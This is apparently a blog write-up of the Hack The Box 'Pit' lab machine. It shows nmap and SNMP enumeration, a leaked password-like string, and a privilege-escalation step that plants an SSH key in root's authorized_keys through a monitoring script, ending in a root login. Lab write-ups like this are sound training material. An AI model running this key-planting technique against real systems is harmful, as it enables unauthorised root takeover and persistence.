<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Pit :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="NMAP ┌──(tom㉿kali)-[~/Documents/hackthebox/pit] └─$ cat nmap.txt # Nmap 7.91 scan initiated Fri Jul 9 15:32:55 2021 as: nmap -oN nmap.txt -vv 10.10.10.241 Nmap scan report for 10.10.10.241 Host is up, received syn-ack (0.59s latency). Scanned at 2021-07-09 15:32:55 BST for 70s Not shown: 997 filtered ports Reason: 928 no-responses and 69 host-unreaches PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 9090/tcp open zeus-admin syn-ack Read data files from: /usr/bin/." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/pit/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Pit :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/pit/" />
<meta property="og:site_name" content="Pit" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/pit/">Pit</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Pit" />
  

  

  <div class="post-content"><div>
        <h1 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/pit<span style="color:#f92672">]</span>
└─$ cat nmap.txt        
<span style="color:#75715e"># Nmap 7.91 scan initiated Fri Jul  9 15:32:55 2021 as: nmap -oN nmap.txt -vv 10.10.10.241</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.241
Host is up, received syn-ack <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
Scanned at 2021-07-09 15:32:55 BST <span style="color:#66d9ef">for</span> 70s
Not shown: <span style="color:#ae81ff">997</span> filtered ports
Reason: <span style="color:#ae81ff">928</span> no-responses and <span style="color:#ae81ff">69</span> host-unreaches
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
9090/tcp open  zeus-admin syn-ack

Read data files from: /usr/bin/../share/nmap
<span style="color:#75715e"># Nmap done at Fri Jul  9 15:34:05 2021 -- 1 IP address (1 host up) scanned in 69.91 seconds</span>

</code></pre></div><p>Two ports running a webserver. 80 and 9090. Port 80 is just the default index.html page and 9090 appears to be a login for some page. It also gave us a domain we can take a look at.</p>
<p>From the NMAP we can see this is a zues cms/ admin panel. I know zeus has been vulnerable in the past so taking a look at searchsploit throws back some results we can take a look at once we have some more information.</p>
<h2 id="nmap-all-ports">NMAP all ports<a href="#nmap-all-ports" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Fri Jul  9 15:41:54 2021 as: nmap -sC -sV -p- -A -oN nmapAll.txt -vv 10.10.10.241</span>

Nmap scan report <span style="color:#66d9ef">for</span> pit.htb <span style="color:#f92672">(</span>10.10.10.241<span style="color:#f92672">)</span>
Host is up, received syn-ack <span style="color:#f92672">(</span>0.62s latency<span style="color:#f92672">)</span>.
Scanned at 2021-07-09 15:41:54 BST <span style="color:#66d9ef">for</span> 3485s
Not shown: <span style="color:#ae81ff">65532</span> filtered ports
Reason: <span style="color:#ae81ff">63403</span> no-responses and <span style="color:#ae81ff">2129</span> host-unreaches
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.0 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page <span style="color:#66d9ef">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin? syn-ack
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad request
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;
|     request
|     &lt;/title&gt;
|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span>&gt;
|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
|     &lt;style&gt;
|     body <span style="color:#f92672">{</span>
|     margin: 0;
|     font-family: <span style="color:#e6db74">&#34;RedHatDisplay&#34;</span>, <span style="color:#e6db74">&#34;Open Sans&#34;</span>, Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: <span style="color:#75715e">#333333;</span>
|     background-color: <span style="color:#75715e">#f5f5f5;</span>
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 10p
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dms-pit.htb/organizationName<span style="color:#f92672">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName<span style="color:#f92672">=</span>dms-pit.htb/organizationName<span style="color:#f92672">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span style="color:#f92672">=</span>US/organizationalUnitName<span style="color:#f92672">=</span>ca-5763051739999573755

<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>From further enumeration we know the login page is called &ldquo;cockpit&rdquo; and is a a web console to monitor a cent os server.</p>
<p>I  couldn&rsquo;t really find much here as nothing really stands out as vulnerable so i took a few steps back and decided to widen my enumeration. With this in mind i started with a UDP NMAP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Completed UDP Scan at 16:11, 1088.89s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
Nmap scan report <span style="color:#66d9ef">for</span> pit.htb <span style="color:#f92672">(</span>10.10.10.241<span style="color:#f92672">)</span>
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.022s latency<span style="color:#f92672">)</span>.
Scanned at 2021-08-11 15:53:27 BST <span style="color:#66d9ef">for</span> 1089s
Not shown: <span style="color:#ae81ff">999</span> filtered ports
Reason: <span style="color:#ae81ff">999</span> admin-prohibiteds
PORT    STATE         SERVICE REASON
161/udp open|filtered snmp    no-response


</code></pre></div><p>This returned a filtered port 161, which is SNMP. This gives me another path to search down, i will start with running SNMP walk to see what results we get back</p>
<h1 id="snmpwalk">SNMPWALK<a href="#snmpwalk" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>                                                                                     
└─$ snmpwalk -Os -c public -v <span style="color:#ae81ff">1</span> 10.10.10.241                                                       <span style="color:#ae81ff">1</span> ⨯ 
iso.3.6.1.2.1.1.1.0 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UT
</span><span style="color:#e6db74">C 2021 x86_64&#34;</span>                                                                                         
iso.3.6.1.2.1.1.2.0 <span style="color:#f92672">=</span> OID: iso.3.6.1.4.1.8072.3.2.10                                                   
iso.3.6.1.2.1.1.3.0 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>146634<span style="color:#f92672">)</span> 0:24:26.34                                                   
iso.3.6.1.2.1.1.4.0 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;Root &lt;root@localhost&gt; (configure /etc/snmp/snmp.local.conf)&#34;</span>            
iso.3.6.1.2.1.1.5.0 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;pit.htb&#34;</span>                                                                
iso.3.6.1.2.1.1.6.0 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;Unknown (edit /etc/snmp/snmpd.conf)&#34;</span>                                    
iso.3.6.1.2.1.1.8.0 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                        
iso.3.6.1.2.1.1.9.1.2.1 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.10.3.1.1                                                  
iso.3.6.1.2.1.1.9.1.2.2 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.11.3.1.1                                                  
iso.3.6.1.2.1.1.9.1.2.3 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.15.2.1.1                                                  
iso.3.6.1.2.1.1.9.1.2.4 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.1                                                         
iso.3.6.1.2.1.1.9.1.2.5 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.16.2.2.1                                                  
iso.3.6.1.2.1.1.9.1.2.6 <span style="color:#f92672">=</span> OID: iso.3.6.1.2.1.49                                                        
iso.3.6.1.2.1.1.9.1.2.7 <span style="color:#f92672">=</span> OID: iso.3.6.1.2.1.4                                                         
iso.3.6.1.2.1.1.9.1.2.8 <span style="color:#f92672">=</span> OID: iso.3.6.1.2.1.50                                                        
iso.3.6.1.2.1.1.9.1.2.9 <span style="color:#f92672">=</span> OID: iso.3.6.1.6.3.13.3.1.3                                                  
iso.3.6.1.2.1.1.9.1.2.10 <span style="color:#f92672">=</span> OID: iso.3.6.1.2.1.92                                                       
iso.3.6.1.2.1.1.9.1.3.1 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The SNMP Management Architecture MIB.&#34;</span>                              
iso.3.6.1.2.1.1.9.1.3.2 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB for Message Processing and Dispatching.&#34;</span>                    
iso.3.6.1.2.1.1.9.1.3.3 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The management information definitions for the SNMP User-based Secur
</span><span style="color:#e6db74">ity Model.&#34;</span>                                                                                            
iso.3.6.1.2.1.1.9.1.3.4 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB module for SNMPv2 entities&#34;</span>                                 
iso.3.6.1.2.1.1.9.1.3.5 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;View-based Access Control Model for SNMP.&#34;</span>                          
iso.3.6.1.2.1.1.9.1.3.6 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB module for managing TCP implementations&#34;</span>                    
iso.3.6.1.2.1.1.9.1.3.7 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB module for managing IP and ICMP implementations&#34;</span>            
iso.3.6.1.2.1.1.9.1.3.8 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB module for managing UDP implementations&#34;</span>                    
iso.3.6.1.2.1.1.9.1.3.9 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB modules for managing SNMP Notification, plus filtering.&#34;</span>    
iso.3.6.1.2.1.1.9.1.3.10 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;The MIB module for logging SNMP Notifications.&#34;</span>                    
iso.3.6.1.2.1.1.9.1.4.1 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.2 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.3 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.4 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.5 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.6 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.7 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.8 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.9 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                    
iso.3.6.1.2.1.1.9.1.4.10 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> 0:00:00.00                                                   
iso.3.6.1.2.1.25.1.1.0 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>150923<span style="color:#f92672">)</span> 0:25:09.23                                                
iso.3.6.1.2.1.25.4.2.1.1.1 <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">1</span>                                 
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">iso.3.6.1.2.1.25.4.2.1.2.3313 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;kworker/0:2-cgroup_pidlist_destroy&#34;</span>
iso.3.6.1.2.1.25.4.2.1.2.4998 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;kworker/0:1-events_power_efficient&#34;</span>
iso.3.6.1.2.1.25.4.2.1.2.5288 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;kworker/u4:0-events_unbound&#34;</span>
iso.3.6.1.2.1.25.4.2.1.2.5293 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;kworker/1:3-cgroup_pidlist_destroy&#34;</span>


</code></pre></div><p>ied^ieY6xoquu</p>
<p>NET-SNMP-EXTEND-MIB::nsExtendObjects</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">michelle@pit ~<span style="color:#f92672">]</span>$ vi check.sh
<span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ cat check.sh 
<span style="color:#75715e">#!/bin/bash</span>

echo <span style="color:#e6db74">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMTUxIqIjN+LjA7QPv+mZS6C5UEXVE4N8YSiEmxy+cPda2E4iyLw0+ps6qURTMIGplWPjlKvA9xwYkvRe6S9/p43AXmh1VQ2DiKqkUAhVZNN5vMrxSNJrn+0PXA9Ku+V57O460x+kzwAFwRaaeOcTLLp3u8pkdNbbTGGlk4qNfNfCg3fLjwnvShbjrpppuxU3nLKQQYvb9VT0jZteLIIENt5rX4us3ULSgcuha/c+0qsbcv3ypotOAKYxyYCrW8oaaoOxZzPEc1O6XMxMcrhV9g0H3iOQbA6ya2he7SzJEL7osb7Gs9tmMkgwcsGwmFnemke1y6BQaTlTyhUa71vRgXZtDySwYAW3PtTjRpGfQ/HlIdQ7MVn2FGO14T5SkEFrXvCuqWG8TfDOzdKHD6XTYnalZQoOSzKJY/dNLlqo2NTTr6Yexy21w4xuKCYrCes5y40Wkjs9KEc9jle5zPLo4KqNva52z/p8Xg5JMJEfDT0WXuv+rKZs6YbZLwFLDI5U=&#39;</span> &gt; /root/.ssh/authorized_keys
<span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">777</span> check.sh 
<span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ ls
check.sh  user.txt
<span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ cp check.sh /usr/local/monitoring/

</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/pit/ssh<span style="color:#f92672">]</span>
└─$ ssh -i id_rsa root@10.10.10.241                                          
Web console: https://pit.htb:9090/

Last failed login: Mon Sep <span style="color:#ae81ff">13</span> 04:44:06 EDT <span style="color:#ae81ff">2021</span> on web console
There was <span style="color:#ae81ff">1</span> failed login attempt since the last successful login.
Last login: Mon Jul <span style="color:#ae81ff">26</span> 06:58:15 <span style="color:#ae81ff">2021</span>
<span style="color:#f92672">[</span>root@pit ~<span style="color:#f92672">]</span><span style="color:#75715e"># cat root.txt </span>

</code></pre></div><h1 id="write-up-start">Write-up start<a href="#write-up-start" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="nmap-1">NMAP<a href="#nmap-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">└─$                                                                                                                        
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>                                                                                                        
└─$ nmap -A 10.10.10.241                                                                                                   
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-08-16 15:11 EDT                                                            
Nmap scan report <span style="color:#66d9ef">for</span> pit.htb <span style="color:#f92672">(</span>10.10.10.241<span style="color:#f92672">)</span>                                                                                
Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.                                                                                               
Not shown: <span style="color:#ae81ff">997</span> filtered ports                                                                                              
PORT     STATE SERVICE         VERSION                                                                                     
22/tcp   open  ssh             OpenSSH 8.0 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>                                                                  
| ssh-hostkey:                                                                                                             
|   <span style="color:#ae81ff">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>                                                             
|   <span style="color:#ae81ff">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>                                                            
|_  <span style="color:#ae81ff">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>                                                          
80/tcp   open  http            nginx 1.14.1                                                                                
|_http-server-header: nginx/1.14.1                                                                                         
|_http-title: Test Page <span style="color:#66d9ef">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux                                              
9090/tcp open  ssl/zeus-admin?                                                                                             
| fingerprint-strings:                                                                                                     
|   GetRequest, HTTPOptions:                                                                                               
|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad request                                                                                             
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf8                                                                                
|     Transfer-Encoding: chunked                                                                                           
|     X-DNS-Prefetch-Control: off                                                                                          
|     Referrer-Policy: no-referrer                                                                                         
|     X-Content-Type-Options: nosniff                                                                                      
|     Cross-Origin-Resource-Policy: same-origin                                                                            
|     &lt;!DOCTYPE html&gt;                                                                                                      
|     &lt;html&gt;                                                                                                               
|     &lt;head&gt;                                                                                                               
|     &lt;title&gt;                                                                                                              
|     request                                                                                                              
|     &lt;/title&gt;                                                                                                             
|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span>&gt;                                                  
|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;                                               
|     &lt;style&gt;                                                                                                              
|     body <span style="color:#f92672">{</span>                                                                                                               
|     margin: 0;                                                                                                           
|     font-family: <span style="color:#e6db74">&#34;RedHatDisplay&#34;</span>, <span style="color:#e6db74">&#34;Open Sans&#34;</span>, Helvetica, Arial, sans-serif;                                             
|     font-size: 12px;                                                                                                     
|     line-height: 1.66666667;                                                                                             
|     color: <span style="color:#75715e">#333333;                                                                                                      </span>
|     background-color: <span style="color:#75715e">#f5f5f5;                                                                                           </span>
|     border: 0;                                                                                                           
|     vertical-align: middle;                                                                                              
|     font-weight: 300;                                                                                                    
|_    margin: <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 10p                                                                                                      
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dms-pit.htb/organizationName<span style="color:#f92672">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span style="color:#f92672">=</span>US               
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1                                           
| Not valid before: 2020-04-16T23:29:12                                                                                    
|_Not valid after:  2030-06-04T16:09:12        
</code></pre></div><p>As we can see from the NMAP there 3 ports open, 22 (ssh), 80 (webserver), and 9090 (webserver). We can also see there are two domains pit.htb and dms-pit.htb.</p>
<p><img src="/images/403subdomain.png" alt="403subdomain"></p>
<p>Navigating to dms-pit.htb we get a 403 forbidden error and on pit.htb we get a default nginx page.</p>
<p>Navigating to pit.htb:9090 we get a centOS cockpit login panel. Some enumeration around this panel shows it is typically for centOS 8 servers which uses identical usernames and passwords from the server. Therefore i would need a users password to gain access to this page. This makes me believe i probably can not bruteforce it.</p>
<blockquote>
<p>&ldquo;By default the cockpit web service is installed on the base system and <a href="https://cockpit-project.org/guide/latest/listen.html" title="TCP Port and Address">socket activated by systemd</a>. In this setup access is controlled by a cockpit specific pam stack, generally located at <code>/etc/pam.d/cockpit</code>. By default this is configured to allow you to login with the username and password of any local account on the system.&rdquo;</p>
</blockquote>
<p>After looking around for some time i dont really find anything so i try an NMAP udp scan which shows SNMP is open.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
</code></pre></div><p>Using snmp-walk i couldn&rsquo;t find any information of use. However after a lot of searching and a hint i found a perl script that found what looks to be a web directory, one that ffuf didn&rsquo;t pick up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.1.3.6.1.4.1.2021.9.1.2.2 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/var/www/html/seeddms51x/seeddms&#34;</span>
.1.3.6.1.4.1.2021.9.1.3.1 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/dev/mapper/cl-root&#34;</span>
.1.3.6.1.4.1.2021.9.1.3.2 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/dev/mapper/cl-seeddms&#34;</span>
  
</code></pre></div><p>Some other potentially useful information it found i am keeping here for reference later.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       409Mi       3.1Gi        24Mi       394Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
